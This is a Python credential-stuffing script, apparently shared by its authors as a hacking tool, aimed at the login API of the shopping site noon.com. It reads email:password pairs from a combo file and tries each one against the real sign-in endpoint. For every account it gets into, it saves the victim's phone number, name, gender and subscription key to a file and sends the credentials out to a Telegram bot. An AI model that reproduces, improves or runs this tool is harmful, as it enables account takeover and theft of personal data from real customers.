try:import os;from requests import post;from time import sleep;from colorama import Fore
except ModuleNotFoundError:exit('[!] Download The Missing Module !')
def header():
    print("""
    
██████╗ ███████╗    ███╗   ██╗ ██████╗  ██████╗ ███╗   ██╗
██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗██╔═══██╗████╗  ██║
██████╔╝█████╗█████╗██╔██╗ ██║██║   ██║██║   ██║██╔██╗ ██║
██╔══██╗██╔══╝╚════╝██║╚██╗██║██║   ██║██║   ██║██║╚██╗██║
██████╔╝██║         ██║ ╚████║╚██████╔╝╚██████╔╝██║ ╚████║
╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝

                By @TweakPY - @vv1ck                                         
""")
def saver(user,pess,rq):
    ID=''#telegram id
    token=''#telegram bot token
    try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=• New user Hacked {user}:{pess} 🦦\n\nBy\t@TweakPY\t-\t@vv1ck')
    except:pass
    try:
        r=rq.json()['data'];phone=r['phone'];sKey=r['subscriptionKey'];lN=r['lastName'];lc=r['languageCode'];jD=r['joinDate'];gr=r['gender'];fnm=r['firstName'];coc=r['countryCode']
        with open('Hacked.txt', 'a') as x:
            acc=f'USR []\nPhone Num:[{phone}]\nLast Name:[{lN}]\nlanguage:[{lc}]\nJoin Date:[{jD}]\nGender:[{gr}]\nFirst Name:[{fnm}]\nEmail:[{user}]\nPassword:[{pess}]\nCountry Code:[{coc}]\nSubscription Key:[{sKey}]\n\n'
            x.write(acc)
    except Exception as i:
        with open('Hacked.txt', 'a') as x:
            x.write(f'USR []\nEmail:[{user}]\nPassword:[{pess}]\n')
def Brute_Force_Noon(user,pess):
    try:
        rq=post('https://login.noon.com/_svc/customer-v1/auth/signin',headers={'Host': 'login.noon.com','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0','Accept': 'application/json, text/plain, */*','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https://login.noon.com/uae-en/','Content-Type': 'application/json','Cache-Control': 'no-cache','X-Locale': 'en-ae','X-Platform': 'web','Content-Length': '56','Origin': 'https://login.noon.com','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Te': 'trailers'},json={"email":user,"password":pess})
        if rq.status_code==200:os.system('cls' if os.name == 'nt' else 'clear');header();print(f"\n┌──(Tweakpy㉿root)-[~BF-Noon.py]\n└─$ {Fore.GREEN}Hacked{Fore.RESET} >> {user}:{pess}");saver(user,pess,rq)
        else:os.system('cls' if os.name == 'nt' else 'clear');header();print(f"\n┌──(Tweakpy㉿root)-[~BF-Noon.py]\n└─$ {Fore.LIGHTRED_EX}Not Hacked{Fore.RESET} >> {user}:{pess}")
    except KeyboardInterrupt:exit()
def O_File():
    FL=input('[+] Combo File Name : ')
    count=0
    try:
        for x in open(FL,'r').read().splitlines():
            count+=1
            user=x.split(":")[0]
            pess=x.split(":")[1];sleep(5);Brute_Force_Noon(user,pess)
    except IndexError:exit()
    except FileNotFoundError:print('[!] The File Not Found !');return O_File()
os.system('cls' if os.name == 'nt' else 'clear');header();O_File()
